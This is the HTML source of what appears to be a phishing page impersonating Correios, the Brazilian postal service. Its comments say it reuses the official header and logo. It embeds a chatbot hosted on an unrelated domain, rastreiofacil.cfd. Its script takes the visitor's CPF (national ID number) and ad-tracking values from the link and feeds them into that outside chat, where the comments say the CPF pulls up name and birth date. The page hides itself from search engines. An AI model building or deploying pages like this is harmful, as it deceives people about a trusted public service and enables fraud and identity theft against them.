<!doctype html>
<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="robots" content="noindex,nofollow">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📦</text></svg>">
    <title>Atendimento</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            width: 100%; height: 100%;
            /* mesmo amarelo do theme do Typebot (#FFC900) — sem isto pisca branco
               entre o load do wrapper e o render do web component */
            background: #FFC900;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        #loader {
            position: fixed; inset: 0;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            gap: 16px;
            color: #14315c;
        }
        #loader .spinner {
            width: 36px; height: 36px;
            border: 3px solid rgba(20,49,92,.25);
            border-top-color: #14315c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        typebot-standard:defined ~ #loader { display: none; }
        typebot-standard { display: block; width: 100%; height: calc(100vh - 3rem); height: calc(100dvh - 3rem); }
        /* header oficial dos Correios — o MESMO da /consulta/ (#menu, logo logonovo.png) */
        #menu {
            font-family: 'Trebuchet MS', arial, helvetica, sans-serif;
            height: 3rem; z-index: 10; position: sticky; top: 0; width: 100%;
            display: flex; align-items: center;
            border-top: 1px solid #fff; border-bottom: 1px solid #ffd400;
            padding: 0.5rem 0.75rem;
            background: url("../consulta/images/logonovo.png") no-repeat center #f5f3f0;
            background-size: auto 50%;
        }
        #menu > a { display: flex; align-items: center; padding: 0 1rem; height: 2rem; }
        #menu .hamburger { flex: 0 0 2rem; margin-right: 1rem; }
        #menu .logo { flex: 1 1 auto; padding-left: 0; }
        #menu .pesquisar { display: none; }
        #loader { top: 3rem; }
    </style>
</head>

<body>
    <section id="menu">
        <a class="hamburger" tabindex="1"></a>
        <a class="logo" href=""></a>
        <a class="pesquisar"></a>
    </section>
    <typebot-standard id="typebot-embed"></typebot-standard>

    <div id="loader">
        <div class="spinner"></div>
        <div>Carregando...</div>
    </div>

    <!-- Typebot embed: @typebot.io/js v0.10.2 (ES module, web component) -->
    <script type="module">
        import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.10.2/dist/web.js';

        // dados integrados: pré-preenche o flow com o que veio da consulta/anúncio
        // (cpf → puxa nome/nascimento automático; + params de tracking do Google)
        var _p = new URLSearchParams(location.search);
        var _vars = {};
        ['cpf','gclid','gbraid','wbraid','ref_id','pos','net','loc','int','disp','cpc','kw','rdn','mtx','plc','cr','domain']
            .forEach(function (k) { var v = _p.get(k); if (v) _vars[k] = v; });

        Typebot.initStandard({
            typebot: 'crra',
            apiHost: 'https://chat.rastreiofacil.cfd',
            prefilledVariables: _vars
        });
    </script>
</body>

</html>
